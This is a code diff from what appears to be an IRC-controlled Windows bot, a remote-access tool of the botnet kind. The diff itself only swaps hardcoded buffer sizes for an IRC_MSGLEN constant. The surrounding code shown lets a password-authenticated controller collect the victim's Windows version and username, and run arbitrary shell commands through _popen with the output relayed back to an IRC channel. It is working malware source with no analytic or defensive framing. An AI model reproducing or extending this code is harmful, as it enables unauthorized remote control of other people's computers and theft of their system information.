@@ -41,17 +41,17 @@ void et_main_loop_win(SOCKET socket, char *nick)
 			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
 			{
 				cmd += 5; /* increment past 'auth ' */
-				char auth_message[256];
+				char auth_message[IRC_MSGLEN];
 
 				if (!strcmp(cmd, IRC_AUTH))
 				{
 					auth = 1;
-					_snprintf(auth_message, 256, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
+					_snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
 					send(socket, auth_message, strlen(auth_message), 0);
 				}
 				else
 				{
-					_snprintf(auth_message, 256, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
+					_snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
 					send(socket, auth_message, strlen(auth_message), 0);
 				}
 			}
@@ -59,8 +59,8 @@ void et_main_loop_win(SOCKET socket, char *nick)
 			{
 				if (!auth)
 				{
-					char unauth_message[256];
-					_snprintf(unauth_message, 256, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
+					char unauth_message[IRC_MSGLEN];
+					_snprintf(unauth_message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
 					send(socket, unauth_message, strlen(unauth_message), 0);
 				}
 				else
@@ -71,28 +71,28 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					}
 					else if (strstr(cmd, "deauth"))
 					{
-						char deauth_message[256];
-						_snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
+						char deauth_message[IRC_MSGLEN];
+						_snprintf(deauth_message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
 						send(socket, deauth_message, strlen(deauth_message), 0);
 						auth = 0;
 					}
 					else if (strstr(cmd, "info"))
 					{
-						char info[512];
+						char info[IRC_MSGLEN];
 
 						OSVERSIONINFO kern_info;
 						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 						GetVersionEx(&kern_info);
-						_snprintf(info, 512, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
+						_snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
 						send(socket, info, strlen(info), 0);
-						ZeroMemory(info, 512);
+						ZeroMemory(info, IRC_MSGLEN);
 
 						char username[128];
 						DWORD username_sz = 128;
 						GetUserName(username, &username_sz);
-						_snprintf(info, 512, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, username);
+						_snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, username);
 						send(socket, info, strlen(info), 0);
-						ZeroMemory(info, 512);
+						ZeroMemory(info, IRC_MSGLEN);
 					}
 					else if (strstr(cmd, "popup"))
 					{
@@ -101,11 +101,11 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					}
 					else
 					{
-						char cmd_output[512];
-						char cmd_message[512];
+						char cmd_output[IRC_MSGLEN];
+						char cmd_message[IRC_MSGLEN];
 
 						FILE *output_file = _popen(cmd, "rt");
-						fread((void *) cmd_output, 1, 512, output_file);
+						fread((void *) cmd_output, 1, IRC_MSGLEN, output_file);
 
 						int i;
 						for (i = 0; cmd_output[i]; i++)
@@ -118,16 +118,16 @@ void et_main_loop_win(SOCKET socket, char *nick)
 
 						if (strlen(cmd_output) >= 500)
 						{
-							_snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
+							_snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
 						}
 						else
 						{
-							_snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+							_snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
 						}
 
 						send(socket, cmd_message, strlen(cmd_message), 0);
 						_pclose(output_file);
-						ZeroMemory(cmd_output, 512);
+						ZeroMemory(cmd_output, IRC_MSGLEN);
 					}
 				}
 			}
